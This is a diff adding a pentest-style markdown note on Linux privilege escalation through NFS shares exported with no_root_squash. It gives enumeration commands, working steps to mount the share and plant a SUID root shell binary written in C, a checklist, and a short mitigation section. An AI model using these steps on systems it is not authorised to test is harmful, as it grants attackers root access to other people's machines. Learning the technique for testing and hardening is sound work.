@@ -1,0 +1,61 @@
+# Privilege Escalation: NFS
+
+## Concept
+NFS (Network File System) shares can be misconfigured with `no_root_squash`, which allows a client's root user to act as root on the exported share — letting you create a SUID binary locally and execute it as root on the target.
+
+## Enumeration
+
+**On the target (if you have a shell already):**
+```bash
+cat /etc/exports
+```
+Look for `no_root_squash`:
+```
+/share_path *(rw,sync,no_root_squash)
+```
+
+**From attacker machine (remote recon):**
+```bash
+showmount -e <target_ip>
+```
+
+## Exploitation (classic `no_root_squash` abuse)
+
+1. On attacker machine, mount the share:
+```bash
+mkdir /tmp/nfs_mount
+mount -o rw,vers=3 <target_ip>:/share_path /tmp/nfs_mount
+```
+
+2. Create a SUID binary as root (attacker is root locally, e.g. in Kali):
+```bash
+cd /tmp/nfs_mount
+cat > shell.c << 'EOF'
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+    return 0;
+}
+EOF
+gcc shell.c -o shell
+chmod +s shell
+```
+
+3. On the **target**, execute the file from the shared mount point:
+```bash
+cd /share_path   # local path corresponding to the NFS export
+./shell
+# now root
+```
+
+## Checklist
+- [ ] Check `/etc/exports` for `no_root_squash`
+- [ ] Run `showmount -e <target>` from attacker box
+- [ ] Mount share, plant SUID binary as local root
+- [ ] Execute planted binary from target's mount point
+
+## Mitigation
+- Use `root_squash` (default) on all NFS exports
+- Restrict exports to specific trusted hosts, not `*`
+- Avoid `rw` on shares unless strictly necessary
